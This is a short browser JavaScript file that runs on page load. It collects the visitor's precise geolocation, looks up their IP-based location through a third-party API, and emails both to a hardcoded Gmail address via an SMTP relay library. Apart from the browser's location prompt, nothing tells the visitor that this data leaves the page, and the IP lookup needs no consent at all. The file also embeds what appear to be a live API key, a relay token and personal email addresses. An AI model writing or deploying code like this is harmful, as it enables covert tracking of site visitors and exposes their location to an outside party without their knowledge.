const geolocationData = {
    latitude: 0.0,
    longitude: 0.0,
    timestamp: 0,
    errorsLog: []
};


function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition, showError);
    } else {
        geolocationData.errorsLog.push("Geolocation is not supported by this browser.");
        sendGeoLocation();
    }
}

function showPosition(position) {
    geolocationData.latitude = position.coords.latitude;
    geolocationData.longitude = position.coords.longitude;
    geolocationData.timestamp = position.timestamp;

    sendGeoLocation();
}

function showError(error) {
    switch (error.code) {
        case error.PERMISSION_DENIED:
            geolocationData.errorsLog.push("User denied the request for Geolocation.");
            break;
        case error.POSITION_UNAVAILABLE:
            geolocationData.errorsLog.push("Location information is unavailable.");
            break;
        case error.TIMEOUT:
            geolocationData.errorsLog.push("The request to get user location timed out.");
            break;
        case error.UNKNOWN_ERROR:
            geolocationData.errorsLog.push("An unknown error occurred.");
            break;
    }

    sendGeoLocation();
}

function fetchIpAddress() {
    fetch("https://api.ipgeolocation.io/ipgeo?apiKey=e635a9377afb4f1780f64e2ae4b5d8f5")
        .then(response => response.json())
        .then(data => {
            sendIpAddressData(data);
        });
}

function sendGeoLocation() {
    let geolocationDataString = JSON.stringify(geolocationData);

    SendEmail("Geo", geolocationDataString);

    console.log(geolocationDataString);
}

function sendIpAddressData(data) {
    let ipAddressDataString = JSON.stringify(data);

    SendEmail("IP", ipAddressDataString);

    console.log(ipAddressDataString);
}

function SendEmail(emailSubject, emailBody) {
    Email.send({
        SecureToken: "57605994-ef84-4e3d-9aed-1fc1088b197e",
        To: 'ahmedyaserx@gmail.com',
        From: "ahmedkhalafx97@gmail.com",
        Subject: emailSubject,
        Body: emailBody
    });
}

function main() {
    getLocation();
    fetchIpAddress();
}


main();